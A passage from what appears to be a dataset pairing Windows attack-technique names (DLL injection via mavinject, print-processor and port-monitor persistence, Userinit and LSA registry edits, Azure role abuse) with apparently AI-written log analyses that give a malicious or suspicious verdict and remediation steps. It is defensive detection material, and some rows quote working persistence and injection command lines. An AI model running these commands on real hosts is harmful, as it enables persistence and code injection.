2. **Elevated Privileges:**
   - There are events (EventID 4672) indicating that the user `admin_test` was granted high-level privileges including SeDebugPrivilege, which could be used maliciously to manipulate system processes.

3. **Frequent Use of System Utilities:**
   - Frequent calling of utility applications such as `whoami.exe`, `hostname.exe`, and `conhost.exe` in various sequences is noted. While these processes are legitimate, they may be used in reconnaissance or during enumeration by attackers.

### **Potential Indicators of Malicious Activity:**

- The registry modification using PowerShell to include `cmd.exe` in the Userinit string is highly suspicious. This type of modification can create a backdoor or persistence by allowing an automatic command prompt during user login.
- Access to and use of high-level privileges without clear justification is concerning.
- Repeated stopping and starting of services related to Microsoft Edge Update could indicate an attempt to manipulate or disguise activity.

### **Assessment and Recommendation:**

**Resolution: MALICIOUS**

The actions observed in the logs, particularly the modification of the registry key for Userinit and the allocation of high privileges to a potentially unauthorized or malicious user account, strongly indicate malicious intent. The presence of such registry modifications, especially involving PowerShell commands altering system login behaviors, is a common tactic for malware persistence.

### **Guidance on How to Proceed:**

1. **Immediate Isolation:**
   - Isolate the affected system from the network to prevent further potential spread or data exfiltration.

2. **Conduct a Malware Scan:**
   - Initiate a comprehensive malware scan on the system to identify any malicious programs or files.

3. **Review User Accounts:**
   - Verify user accounts, particularly those with elevated privileges, to ensure their legitimacy. Consider resetting passwords for the `admin_test` user and others with admin privileges.

4. **Check for Persistence Mechanisms:**
   - Investigate the Userinit registry key and other common persistence locations for unauthorized changes or entries.

5. **Patch and Update Systems:**
   - Ensure all systems are up to date with the latest security patches to protect against known vulnerabilities.

6. **Monitor Network Traffic:**
   - Implement monitoring of network traffic for unusual activity that could indicate communication with a command and control server.

7. **Forensics Analysis:**
   - Consider performing a more in-depth forensic analysis of the system to understand the full scope of compromise and collect evidence.

By following these steps, the organization can address the immediate threat and bolster its defenses against future attacks."
Process Injection via Extra Window Memory (EWM) x64 executable,"Upon analyzing the provided Windows event logs, the following observations have been made:

1. **PowerShell Execution**:
   - There are repeated instances of PowerShell being executed with the command:
     ```
     powershell.exe & {C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.011\bin\data.011_x64.exe}
     ```
   - This is indicative of a script or command execution directing PowerShell to run an executable located in a temporary directory. This behavior is often associated with suspicious activity as legitimate PowerShell usage typically involves system administration scripts or commands, not executing binaries directly from temporary folders.

2. **Process Creation**:
   - Corresponding Sysmon logs show the execution of `data.011_x64.exe` from the path `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.011\bin\`, with a hash value provided. The nature of the file and lack of identifiable details such as a description or known product further increase suspicion.
   - The process originated from a PowerShell command line which aligns with the PowerShell event logs indicating malicious usage.

3. **Security Auditing**:
   - Event 4624 (Successful Logon) and 4672 (Special Privileges Assigned) were triggered for the ""SYSTEM"" user, which are common and expected for routine system operations. While privilege escalation wasn't detected, ensuring the legitimacy of these operations should be part of ongoing monitoring.
   - Event ID 5379 recurred, indicating credential activity. While the return code was `3221226021`, which often suggests login failures or issues accessing credentials, repeated attempts should be scrutinized further.

4. **General Observations**:
   - Other processes listed in the Sysmon logs (such as HOSTNAME.EXE, wevtutil.exe, etc.) appear to be legitimate and part of normal Windows operations based on the description, file version, and paths provided.

### Conclusion:
The presence of a PowerShell session executing a binary from a temporary path suggests an anomaly that could indicate malicious activity. This behavior is often seen in attempts to bypass security controls or execute payloads in memory.

### Resolution: **SUSPICIOUS**
- The activity recorded in the logs suggest potentially unwanted or harmful behavior, especially related to the use of PowerShell to execute unknown binaries.
- Further investigation is required to determine the intent and origin of the command, including hash verification against threat intelligence databases, analysis of network activity during the time of execution, and any other related artifacts on the system.

### Recommendation:
- Quarantine the suspect file (`data.011_x64.exe`) and analyze it in a secure environment (sandbox).
- Monitor for similar PowerShell and process execution patterns across your network.
- Review any recent changes or deployments that may have introduced this activity and check for similar executions on other systems."
Print Processors,"Upon reviewing the provided Windows event logs, several pieces of potentially malicious activity stand out, particularly revolving around the use of PowerShell and the manipulation of the print spooler service. Here's a detailed breakdown:

### Indicators of Anomalous or Malicious Activity:

1. **PowerShell Script Execution:**
   - The PowerShell logs and Sysmon logs collectively indicate suspicious activity. A PowerShell script was executed that modified settings related to the print spooler service, specifically using commands to stop the spooler, copy a `fileTest.dll` file to a print processor directory, and modify the registry (`reg add`). This kind of activity is often associated with attempts to exploit or backdoor a system.
   - Commands include:
     - `Set-Service -Name ""spooler"" -StartupType Automatic`
     - `net stop spooler`
     - `Copy-Item ... fileTest.dll`
     - `reg add ...`
     - `net start spooler`

2. **Registry Modifications:**
   - Registry modifications related to the print spooler (`HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\file`) are logged. Such modifications can be leveraged for maintaining persistence or executing malicious payloads through DLL injection or hijacking.

3. **DLL Injection/Manipulation:**
   - The process involving copying `fileTest.dll` to the print processors directory is highly suspicious. It suggests potential attempts to inject malicious code into a trusted location where it could potentially run with elevated privileges, which is a known tactic used by attackers.

4. **Command Line Execution:**
   - The detailed command lines executed (e.g., in PowerShell and via `cmd.exe`) further support the suspicion of malicious intent. The sequence and nature of the commands (especially the `Copy-Item` and `reg add` commands) align with activities seen in attack patterns where persistence mechanisms or evasion techniques are being set up.

### Assessment of Situation:

Based on the logs, the activity observed is typical of an attempt to exploit or abuse the printing system on the Windows host. Such behavior aligns with known attack vectors, possibly to install malicious payloads or maintain persistence on the host.

   - Conduct a deeper forensic investigation to evaluate the extent of the compromise and any potential data exfiltration or additional backdoors.

3. **Audit and Review:**
   - Review all connected devices and the network for similar suspicious activities or artifacts indicating a broader compromise.
   
4. **Patching and Mitigation:**
   - Ensure that all relevant vulnerabilities are patched, especially those related to the print spooler service and any other noted vulnerabilities that could be exploited similarly.
   
5. **Security Posture Improvement:**
   - Strengthen PowerShell execution policies and log monitoring, and enforce stricter access controls and permissions.

6. **Inform Stakeholders:** Update your incident response team and relevant stakeholders promptly, adhering to organizational policies for incident reporting and management."
Process Injection via mavinject.exe,"Upon reviewing the provided Windows event logs, we can identify several key points which require attention regarding potentially suspicious activities:

### Key Observations:

1. **PowerShell Activity with Injection Command:**
   - The logs indicate that PowerShell was executed with a complex command line, which includes the `mavinject` utility to inject a DLL file (`data.001.dll`) into a Notepad process. This behavior is highly indicative of malicious activity, especially considering it involves DLL injection, a common technique used in malware to execute arbitrary code in another process.
   - Specific command: 
     - `powershell.exe & {$mypid = (Start-Process notepad -PassThru).id, mavinject $mypid /INJECTRUNNING ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\x64\data.001.dll"", Stop-Process -processname notepad}`

2. **Frequent Use of `wevtutil.exe`:**
   - There are multiple instances of `wevtutil.exe` being executed. While `wevtutil` is a legitimate Windows utility used to manage event logs, frequent executions in quick succession might indicate an attempt to harvest or manipulate event logs potentially to cover tracks.

3. **Typical System Utility Usage:**
   - Several system utilities such as `conhost.exe`, `hostname.exe`, `whoami.exe`, and `notepad.exe` were observed in the logs. However, only the `notepad.exe` instance was part of the suspicious DLL injection via PowerShell.

4. **Service Operations:**
   - Programs such as `sppsvc.exe`, `WmiPrvSE.exe`, `TrustedInstaller.exe`, `TiWorker.exe`, and Microsoft Edge installers are legitimate processes associated with system and application updates. These entries do not stand out as malicious on their own.

### Assessment:
The utilization of PowerShell with mavinject to perform DLL injection suggests an indicator of potential compromise. Given the presence of this sophisticated operation and the related PowerShell logs confirming this execution, this behavior aligns with known malicious tactics, such as code injection, often used for persistence, privilege escalation, or arbitrary code execution.

### Conclusion:
Based on the above observations, I would classify this situation as **MALICIOUS** due to the confirmed DLL injection attempt using PowerShell, which poses a significant security threat.

### Guidance on How to Proceed:
1. **Immediate Containment:**
   - Isolate the affected system (Server002) from the network to prevent further spreading or harm.
   
2. **Thorough Investigation:**
   - Collect and analyze full memory captures and forensic images of the system for further investigation.
   - Review additional logs and identify any external communications that may suggest data exfiltration or command and control connections.

3. **Remediation:**
   - Revoke and reset credentials associated with `admin_test` and potentially other accounts affected.
   - Assess and enhance defenses such as endpoint anomaly detection, application whitelisting, and staff cybersecurity awareness.

4. **Report to Relevant Stakeholders:**
   - Inform management and the incident response team for coordinated actions and to prevent similar incidents.
   - Consider notifying law enforcement if there is evidence of a breach involving sensitive data.

These steps are aimed at addressing the immediate threat and minimizing the potential impact while gathering necessary information to prevent future occurrences."
Azure AD - Add Company Administrator Role to a user,"After reviewing the provided Windows event logs, I have identified some key points that indicate suspicious behavior:

1. **PowerShell Activity**: 
   - There's a significant amount of PowerShell activity on `Server002`, with scripts aimed at modifying Microsoft Online (MSOL) settings (`Connect-MsolService` and `Add-MsolRoleMember`). The scripts use hardcoded credentials, including a password stored as plain text, which is a poor security practice. Such activity can potentially lead to privilege escalation, especially given the actions trying to add a user to the `Company Administrator` role.
   - The use of `-AsPlainText -Force` in the `ConvertTo-SecureString` command indicates that sensitive information might be mishandled.

2. **Remote Session Execution**: 
   - The PowerShell logs show execution from the `ConsoleHost`, indicating that these commands might have been executed remotely. This is further enforced by the Sysmon logs, which show PowerShell and other command executions under an admin user session `SERVER002\\admin_test`.

3. **Sysmon Process Creation and Execution**:
   - Multiple instances of typical system utilities (`hostname.exe`, `whoami.exe`, `PowerShell.exe`, etc.) were executed by the same user `SERVER002\\admin_test` in a short span of time. While these utilities are common, their clustered execution could suggest post-compromise reconnaissance or persistence checks.
   
4. **Task Executions**:
   - The presence of `taskhostw.exe` and `UsoClient.exe` in Sysmon logs under `NT AUTHORITY\\SYSTEM` is typically benign, as they are system services related to task scheduling and Windows updates, respectively. However, the close timing with the PowerShell events warrants closer inspection.

5. **Windows Update Logs**:
   - The System logs show a series of Windows Update checks (`EventID: 44`) happening concurrently with the PowerShell activities. While these usually represent routine operations, the alignment with suspicious actions might suggest an attempt to mask malicious behavior under regular system activity.

**Assessment**:
- There is a mixture of benign and potentially malicious activity. The suspicious PowerShell script execution with attempts for privilege elevation and credential misuse needs immediate attention, as it could indicate a compromise or an attempt to gain unauthorised access.

**Recommendations**:
1. **Immediate Response**:
   - Suspend the account used for the suspicious activity (`admin_test`) and investigate further to ensure the account's integrity.
   - Check current members of the `Company Administrator` role and any changes to MSOL roles.

2. **Log Analysis**:
   - Thoroughly review remote access logs and any additional PowerShell command logs for similar patterns or anomalies.
   - Investigate whether any credentials have been compromised or misconfigured.

3. **System and Network Monitoring**:
   - Increase scrutiny on this server and network segment for any further anomalous activity.
   - Use network traffic analysis to detect potential data exfiltration or lateral movements.

4. **Preventative Measures**:
   - Enforce stricter access policies and multi-factor authentication (MFA), especially for accounts with administrative privileges.
   - Implement proper logging and alerting on admin activities and sensitive command execution.

**Resolution**: Based on these findings, the logs are classified as **SUSPICIOUS**. More in-depth investigation is required to fully understand the scope of the potential compromise and to mitigate associated risks."
Persistence by modifying Windows Terminal profile,"Based on the analysis of the provided logs, the following observations were made:

### Suspicious or Anomalous Behavior

1. **PowerShell Activity**: There are multiple instances of PowerShell execution, specifically by the user `SERVER002\admin_test`. One notable command sequence involves moving a file (`settings.json`) and downloading a file from a GitHub URL:
   ```powershell
   mv ~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json ~\AppData\Local\Temp\settings.json
   Invoke-WebRequest ""https://github.com/file/file-file/blob/master/files/data.015/src/settings.json?raw=true"" -OutFile ""~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json""
   ```
   The use of `Invoke-WebRequest` to download a file and overwrite the settings file could be indicative of an attempt to modify or replace legitimate configuration files.

2. **Wevtutil Activity**: There are repeated executions of `wevtutil.exe` by the user `SERVER002\admin_test`, with events indicating potential log manipulation:
   ```wevtutil
   ""C:\Windows\system32\wevtutil.exe"" epl Microsoft-Windows-Sysmon/Operational C:\Users\ADMIN_~1\AppData\Local\Temp\TempLog.evtx
   ```
   This command is exporting the Sysmon log, which could indicate attempts to clear or manipulate log files to hide activities.

3. **Conhost.exe Processes**: A significant number of `conhost.exe` processes are spawned in conjunction with other processes like `powershell.exe`, `wevtutil.exe`, `whoami.exe`, etc. This behavior may be legitimate but can also indicate script execution or automated tasks.

4. **High Integrity Level Execution**: Processes such as PowerShell and wevtutil are running with high integrity, which suggests these commands have elevated privileges. This can be normal in some administrative contexts but can also be used in lateral movement or privilege escalation attacks.

### Indicators of Malicious Activity or Compromise

- **Indicators**: The use of PowerShell scripts to download and potentially modify configuration files, as well as the repeated use of `wevtutil` for log manipulation, are potential indicators of nefarious activities aiming to persist control or remove traces.

### Assessment

Given these observations, the activity listed, particularly the PowerShell script fetching a settings file from an external source and the frequent use of wevtutil.exe, do not represent typical administrative actions without context. Pre-etablished security protocols on the server and an understanding of regular administrative tasks might dismiss this as benign or could indicate a threat.

### Resolution
- **Resolution**: **SUSPICIOUS**
  - The events logged show a behavior pattern that doesn't seem typically administrative or benign without explicit justification. Further investigation is needed to confirm the necessity and legitimacy of these actions. It is crucial to verify with the system's administrator if these were expected maintenance tasks or investigate any potential unauthorized access that executed these commands.

### Guidance on How to Proceed

1. **Confirm with System Administrators**: Verify if these commands were part of routine maintenance or administration tasks.
2. **Review Access Logs**: Check access logs around the time these activities were logged to identify any unusual logins or access patterns.
3. **Isolate and Analyze the Downloaded File**: The file downloaded from GitHub should be analyzed to confirm its contents and legitimacy.
4. **Conduct Endpoint Threat Hunting**: Use threat detection tools to scan the affected system for other indicators of compromise or lateral movement.
5. **Security Controls Review**: Ensure security measures like application whitelisting and script monitoring are properly configured and deployed.

With these steps, you will determine if these activities were indeed malicious or part of an authorized task."
Add Port Monitor persistence in Registry,"Upon review of the logs provided from various sources (Windows PowerShell, Security, Sysmon, Application, and System), here's a detailed analysis of the events and potential indicators of compromise:

### Indicators of Suspicious Activity:
1. **Registry Modification with Command Prompt:**
   - The command line used by `cmd.exe`:
     ```
     ""cmd.exe"" /c reg add ""hklm\system\currentcontrolset\control\print\monitors\file"" /v ""Driver"" /d ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.010\bin\PortMonitor.dll"" /t REG_SZ /f
     ```
   - The usage of `reg add` to modify registry entries related to Print Monitors is concerning. Modifying keys typically associated with hardware drivers can be a technique used in persistence mechanisms or privilege escalation.

2. **Execution of Common Tools:**
   - Tools like `whoami.exe` and `hostname.exe` are typically benign in nature but can be used by malicious actors to gather system information.
   - Frequent usage of `whoami.exe` and the context in which it is used should be part of further investigation.

3. **`wsmprovhost.exe` as Parent Process:**
   - `wsmprovhost.exe` is often seen when PowerShell scripts are executed remotely via Windows Remote Management (WinRM).
   - Although nothing explicitly malicious was executed via PowerShell in the logs, the context suggests potential scripting or automation tasks occurring.

4. **Edge Update Activity:**
   - Numerous executions related to Microsoft Edge Update were observed. These included execution of updates and registration components. 
   - While these actions might be legitimate due to an actual update, it would be prudent to verify if these activities align with legitimate update schedules from Microsoft.

### Log and System-Related Notes:
- **Time Change Events:**
  - The logs show system time corrections using `svchost.exe` related processes. This typically indicates synchronizing with a time server (`time.windows.com`) and appears benign.
  
- **Sysmon and Application Events:**
  - Commands executed match normal update and administrative behavior. The activity related to Microsoft Edge Update does not immediately highlight malicious behaviors but needs confirmation against expected behavior.

### Conclusion & Recommendations:
- **Resolution: SUSPICIOUS**
  - Based on the analysis, the registry modification commands and processes executed under `admin_test` show non-standard administrative behavior that can pose security implications, especially if unauthorized.
  - The Edge update patterns and registry modifications require further validation to ensure no malicious components are being loaded or unexplained privileged activities are occurring.

### Next Steps:
1. **Validate Registry Changes:** Investigate whether the `PortMonitor.dll` is a legitimate file. Analyze its origin, hash, and compare it to known good or publish a hash for analysis.
2. **Audit User Activity:** Review the user `admin_test` to confirm any recent administrative tasks and correspond to expected behaviors.
3. **Review Edge Update:** Confirm if the Edge updates are scheduled and investigate the path for any discrepancies. Explore if the update files match SHA256 hashes published by Microsoft.
4. **Further Log Analysis:** Hunt for similar patterns or expand the log search around these timestamps for deeper scrutiny into lateral movements, particularly around the process creation of administrative tools and unusual command execution."
Azure - adding service principal to Azure role in subscription,"Upon reviewing the provided logs, the following points of interest and potential anomalies have been identified:

### PowerShell Logs
- The execution of PowerShell scripts involving Azure operations is evident. The script involves:
  - Importing a module named 'Az.Resources'.
  - Using credentials to connect to Azure (`Connect-AzAccount`).
  - Checking for a service principal named ""SuperSP"" and an Azure subscription.
  - Assigning a 'Reader' role to the service principal ""SuperSP"".

**Concerns**:
- The presence of a plaintext password (`""p4sswd""`) being converted into a secure string could suggest that credentials are being handled insecurely. Hardcoded passwords are a security risk.
- Using PowerShell to automate role assignments can be normal in an enterprise setting, but it's important to ensure that such scripts are authorized and reviewed, possibly indicating administrative-level operations.

### Security Logs
- Numerous `EventID 4798` logs indicate enumeration of local security groups by the `CompatTelRunner.exe`. Typically, this executable is related to telemetry and should not normally perform operations involving privileged user management or enumeration.
- An event with `EventID 4672` indicates a privileged logon was established which includes high privileges (`SeDebugPrivilege`, `SeLoadDriverPrivilege`, etc.), common for SYSTEM level accesses.
- `EventID 4624` confirms a logon session with type 5 (service startup) by the SYSTEM account, which is expected behavior.

**Concerns**:
- The use of `CompatTelRunner.exe` to enumerate local security groups is unusual and could indicate an attempt to gather intelligence on permission structures within the system.
- The frequent operation of the `CompatTelRunner.exe` points towards potential misuse for privilege enumeration, warranting further investigation.

### Sysmon Logs
- The user `SERVER002\\admin_test` is involved in several process executions involving PowerShell, wevtutil, and conhost, which may be associated with administrative activities or attempts to manipulate logs or environment settings.
- The process `HOSTNAME.EXE` and `whoami.exe` were run, which might be used for network footprinting or checking the current user context.

**Concerns**:
- `wevtutil.exe` is often used to query or clear event logs. Its frequent appearance in the logs suggests potential tampering or review of event logs by the user `admin_test`.
- The series of executed commands suggests possibly gathering system information and interacting with logs, a common red flag in potential attack scenarios.

### Overall Assessment
The combination of actions involving PowerShell scripts, the use of administrative tools (`wevtutil`) for potential log manipulation, enumeration by `CompatTelRunner.exe`, and system interrogation commands (like `whoami`) strongly suggest that there may be suspicious behavior occurring on this host. 

### Conclusion
- **Resolution: SUSPICIOUS**

### Guidance
- Verify the authorization and legitimacy of the PowerShell script within your organization.
- Review and potentially restrict the permissions or usage of `CompatTelRunner.exe`, especially if it's not being used for legitimate telemetry.
- Investigate the actions and access patterns of the user `admin_test`. Ensure that they are aware and compliant with security policies, or conduct further analysis to uncover unauthorized actions.
- Conduct a broader review of the system and network logs to check for any external compromise indicators or further anomalous activity."
TinyTurla backdoor service w64time,"### Detailed Analysis of the Logs

Upon further review of the logs, several events stand out as potentially malicious or at least suspicious:

1. **Time Change Events (Event ID: 4616 in Security Log):**
   - Two time change events occur almost simultaneously, which may explain why the time seems to go backward slightly in some logs (""NewTime"" is earlier than ""PreviousTime""). This can indicate a malicious attempt to alter time stamps for evasion purposes, although it could also be due to a misconfiguration or legitimate time sync operation.

2. **Privilege Assignments (Event ID: 4672 in Security Log):**
   - The user ""admin_test"" is granted several high-level privileges, including `SeDebugPrivilege`, `SeLoadDriverPrivilege`, and `SeTakeOwnershipPrivilege`, which are often targeted by attackers looking to escalate privileges or maintain persistence. The privileges granted are consistent with a successful high-privilege logon.

3. **Process Creation with Command-Line Arguments (Sysmon logs):**
   - A suspicious `cmd.exe` invocation with complex command-line arguments, including the installation and configuration of a service ""W64Time"" with references to a custom DLL `w64time.dll`. This behavior is very indicative of persistence mechanisms or backdoor installation attempts.

4. **Creation and Manipulation of Services (System and Sysmon Logs):**
   - Multiple entries tied to the creation and manipulation of the ""W64Time"" service with the corresponding manipulation of registry keys. This activity is often a hallmark of malware attempting to maintain persistence by installing a service with a benign appearance, while potentially executing arbitrary malicious activities.

5. **Processes Executed by Suspicious Users (Sysmon logs):**
   - The `wevtutil.exe`, `cmd.exe`, and `sc.exe` processes executed by ""admin_test"" further enhance the suspicion as these are often leveraged by attackers for log clearance, command execution, and service manipulation, respectively.

### Assessment

Based on the evidence in the logs:

- The sequence of events, including time manipulation, high privileges granted to ""admin_test"", and the creation of a custom Windows service with a non-standard DLL, strongly suggests an attempt at privilege escalation, service persistence, and possible backdoor installation.

- The specific command syntax and the use of native Windows utilities point to deliberate actions consistent with attack behaviors, likely attempting to evade detection.

### Resolution

- **MALICIOUS:** The activities observed within the logs are highly indicative of an attempted or successful compromise, particularly focusing on persistence and privilege escalation vectors.

### Guidance on How to Proceed

1. **Immediate Quarantine:**
   - Based on the observed malicious activities, the affected system (Server002) should be immediately isolated from the network to prevent further compromise or lateral movement.

2. **Comprehensive Incident Response:**
   - Initiate an incident response process to investigate the full scope of the breach, inspect all related systems, and ascertain if any data exfiltration or further network compromise has occurred.

3. **Forensic Analysis:**
   - Conduct a detailed forensic analysis of the ""w64time.dll"" file and other binaries executed during the suspicious time frame for signs of malicious code or unauthorized modifications.

4. **Review and Audit:**
   - Review user ""admin_test"" and assess how this account was potentially compromised. Assess the need for enhanced authentication mechanisms, such as Multi-Factor Authentication (MFA).

5. **Remediation and Repair:**
   - Remove any unauthorized services, registry changes, and custom DLLs on the affected systems.
   - Apply necessary patches, update configurations, and review policy compliance for Windows time service settings.

6. **Monitor and Alerting:**
   - Enhance monitoring and alerts for similar activities across the network, paying particular attention to privilege escalations and time changes. Deploy tools to detect anomalous behavior patterns and service manipulations.

By taking these steps, the organization can address the immediate threat while also reducing the likelihood of reoccurrence."
Create shortcut to cmd in startup folders,"Upon evaluating the provided Windows event logs, the analysis covers multiple log types including Application, Sysmon, System, Windows PowerShell, and Security logs. Here's a detailed review of notable activities:

1. **Sysmon Logs Analysis:**
   - Observed legitimate applications like `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `HOSTNAME.EXE`, and `SearchProtocolHost.exe` executing normally, with no anomalous command-line arguments or execution patterns.
   - Significant activity is noted with `powershell.exe` spawning a suspicious command aimed at creating `cmd.exe` shortcuts in both specific user and common startup folders, likely for persistence. This technique employs `New-Object -ComObject (""WScript.Shell"")` to create these shortcuts.

2. **Windows PowerShell Logs Analysis:**
   - Reflects the execution of PowerShell scripts aligning with the suspicious behavior observed in Sysmon logs. The PowerShell script actively creates shortcuts to execute `cmd.exe` upon startup, indicating a potential unauthorized persistence mechanism.

3. **Time Synchronization:**
   - System time changes were noted, aligning with `svchost.exe`, which is consistent with time synchronization to keep the system clock accurate and is generally benign unless indicating attempts to hide tracks by altering timestamps, but seems innocent here.

4. **Edge Update Observations:**
   - Multiple executions related to `MicrosoftEdgeUpdate.exe` and respective update components were recorded, suggesting legitimate update activities consistent with those managed by Microsoft Edge update services.

5. **Security Monitoring:**
   - No direct alerts from the Security logs (EventID 4616) were present indicating problems, reflecting expected Windows time adjustments without suspicious process activity.

**Findings:**
- The creation of startup shortcuts using PowerShell to launch `cmd.exe` is a recognized persistence technique and is notably out of place in a routine operational context. This behavior could be indicative of malicious intent aimed at maintaining access or executing additional payloads upon system boot.
- Although legitimate processes and updates occurred, the PowerShell execution stands out as a potentially malicious incident, likely introduced by a threat actor using a script to ensure their control mechanisms persist through system reboots.

**Resolution:**
- **MALICIOUS** - The logs contain PowerShell activity that is 100% indicative of potential malicious conduct through recognized persistence techniques. Immediate steps should be taken to investigate the source of the PowerShell command, remove any unauthorized shortcuts or scripts, and perform a broader security audit to identify further compromise. Consider isolating the affected system for a detailed forensic analysis to ascertain any further impacts."
Edit an existing time provider,"Upon reviewing the provided logs, I have identified several events that raise significant concerns about the potential compromise of the Windows host. Here's a detailed analysis of the logs and the suspicious activities detected:

1. **Unusual PowerShell Activity**: There is notable PowerShell activity launching a script which includes stopping and starting the Windows Time service, copying a DLL file, and modifying the registry. Specifically, a DLL file is copied to `C:\Users\Public\fileTest.dll`, and multiple registry entries for the Windows Time service (`W32Time`) are altered. This type of activity is often associated with persistence techniques used by malware to ensure execution at system startup or during operation.

2. **Modification of System Time and Services**: This script makes modifications to important system settings. Altering the time provider settings and DLLs related to the Windows Time service (`W32Time`) can indicate an attempt to tamper with the system's time configuration for malicious purposes, such as evading logging or forensic analysis timestamps.

3. **Service and DLL Registration**: The registry entries alterations and the DLL manipulation, particularly under a critical system service like Windows Time, suggest an intent to execute a malicious payload using system infrastructure, which is a technique often employed by advanced persistent threats (APTs).

4. **High Privilege Process Execution**: The PowerShell commands and reg modifications are carried out with high integrity level and under the `SERVER002\admin_test` account, suggesting execution with elevated privileges. This is typically necessary to perform system-level changes which might require admin rights.

5. **The Sysmon Logs Show Repetitive Executions Involving Key System Applications**: The execution of processes such as `wevtutil.exe`, `conhost.exe`, and `net.exe` several times in close succession is curious and suggests potential abuse of Windows utilities, possibly for log manipulation or other stealth activities.

6. **Errors Indicating DLL Load Failures**: There are system log entries indicating that a specified module could not be found for the 'NtpServer' provider. This can indicate failure in successfully executing or loading a malicious payload, but the intent is clear.

7. **Scheduled Updates and Edge Update Executions**: While the Microsoft Edge updates appear benign, the timing and execution context may coincide with the suspicious PowerShell activity. Leveraging regular update mechanisms for malicious purposes isn't unheard of but currently poses a lesser concern compared to the other activities.

### Assessment:
Based on the identified activities, I assess the situation as: **MALICIOUS**.

### Threat/Risks:
The detected PowerShell script activity suggest highly suspicious intentions, likely to maintain persistent access through system service manipulation and registry modification. Such activities are consistent with malware attempting to install itself into the system using backdoor techniques.

### Guidance on How to Proceed:
- **Immediate Isolation**: Isolate the affected host from the network to prevent further potential spread or data exfiltration.
- **Deep Forensic Analysis**: Conduct a thorough forensic investigation to understand the full impact and scope of the compromise. Focus on identifying the source of the compromise and any potential data that may have been accessed or exfiltrated.
- **Mitigation and Cleanup**: Identify and remove the malicious DLL and scripts. Restore the affected system files and registry entries to standard configurations. Consider full wipe and restoration from backups if deemed necessary.
- **Review Privileged Account Activities**: Investigate and audit the activities of the `SERVER002\admin_test` account to assess any further unauthorized access or actions taken using privileged credentials.
- **Strengthen Security Posture**: Implement tighter script execution policies, enhance monitoring of privileged account activities, and enforce stronger access controls.

This investigation highlights potential exploitations that could impact system integrity and overall organizational security, warranting immediate responsive actions."
Modify HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig Security Support Provider configuration in registry,"After analyzing the provided Windows event logs, several details stand out as suspicious or potentially malicious:

1. **Use of PowerShell**: 
   - The PowerShell script alters registry keys related to security packages within the LSA (Local Security Authority) configuration, specifically modifying the 'Security Packages' property to include an ""AtomicTest.dll"". This action is highly unusual and often associated with unauthorized access or backdoor installation techniques. PowerShell is commonly used in malicious activities due to its powerful capabilities.

2. **Clearing of Event Logs**:
   - There are multiple instances where event logs have been cleared:
     - System log at `2024-10-27 16:50:46`.
     - Windows PowerShell log at `2024-10-27 16:50:46`.
     - Security log at `2024-10-27 16:50:46`.
   - This action is frequently performed by attackers attempting to hide their tracks after conducting unauthorized activities on a system.

3. **High Privilege Executions**:
   - Multiple processes are being executed with `NT AUTHORITY\SYSTEM` privileges. While this can occur in legitimate operations, the combination with other suspicious activities strengthens the case for a potential compromise.

4. **Presence of Network Connection Utility Executions**:
   - Execution of `whoami.exe` and other command line utilities might be benign if related to system admin tasks, but in conjunction with the modification of security settings and log clearances, they could indicate reconnaissance activities performed by a threat actor.

5. **Timing and Pattern of Activity**:
   - The activities occur in rapid succession, pointing to potentially automated processes or scripts systematically conducting these tasks, often seen in organized attacks.

### Assessment:
Given the aggregate evidence of PowerShell script usage to alter security configurations, deliberate clearing of logs, execution of high-privileged processes, and network command usage, this points towards malicious activity. These events align with typical behaviors observed in system exploits and malware deployment.

### Resolution:
**MALICIOUS** - The activities contain indicators that strongly suggest malicious intent and system compromise.

### Guidance:
- Immediately conduct a full incident response investigation to isolate the system and prevent further propagation.
- Review recent changes to critical registry keys and installed services for unauthorized modifications.
- Analyze network traffic to identify any unauthorized outbound communication or data exfiltration attempts.
- Restore affected systems from a known-good backup after ensuring no further compromise traces are present.
- Strengthen monitoring and implement alerts for suspicious PowerShell script executions, especially those impacting security configurations."
HKLM - Append Command to Winlogon Userinit KEY Value,"Upon careful analysis of the provided Windows event logs, the following observations have been made:

1. **Suspicious PowerShell Activity:**
   - Multiple PowerShell logs indicate a PowerShell script execution with the intention to modify the Windows Registry key `HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon` to include ""C:\Windows\System32\calc.exe"" in the `Userinit` value. This is an attempt to modify the system startup behavior, which is often indicative of malicious intent, possibly to ensure persistence of a script or program across reboots.

2. **Sysmon Logs:**
   - The Sysmon logs correlate with the PowerShell activities, showing the execution of processes, particularly the PowerShell process with the command line attempting registry modifications as mentioned above.
   - There are multiple Sysmon logs of processes like `wevtutil.exe` and `conhost.exe` executed by the user `SERVER002\admin_test`, which seems legitimate and could be part of regular administrative tasks. However, the timing and association with PowerShell modifications need more investigation.
   - The execution of standard processes like `whoami.exe`, `hostname.exe`, and `setup.exe` are observed and appear to demonstrate typical benign activities concerning checking system identity and update installations.

3. **Conclusion on Activity:**
   - The primary concern is the PowerShell script, which attempts to persistently modify registry settings related to startup applications. This is a well-known tactic for malware persistence and must be treated with caution.
   - No other definitive indications within logs point to additional malicious activities or advanced persistent threats, though certain activities could be more deeply investigated for unusual patterns.

**Assessment: SUSPICIOUS**

**Recommended Actions:**
- Immediately investigate the PowerShell script execution and the source. Verify if this is an authorized administrative action or a potential unauthorized access attempt.
- Conduct a thorough review of the user account `SERVER002\admin_test` for any signs of compromise or unauthorized activities.
- Restore any altered registry keys to their original state and closely monitor for further modification attempts.
- Increase monitoring and visibility on PowerShell and registry modification events.
- Conduct a full antivirus and anti-malware scan on the affected host to ensure no other malicious artifacts are present.
- Consider using endpoint detection and response (EDR) tools to further analyze and create alerts for similar suspicious activities in the future. 

Following these steps will help determine whether further malicious activities occurred and aid in securing the host system."
Azure AD Application Hijacking - Service Principal,"Based on the analysis of the provided logs, several indicators suggest potentially malicious activity. Below is a detailed breakdown of the findings:

### Detailed Analysis:

#### PowerShell Logs:
- **Event Activity:**
  - Multiple PowerShell scripts executed involving the import of the AzureAD module and manipulation of Azure AD credentials.
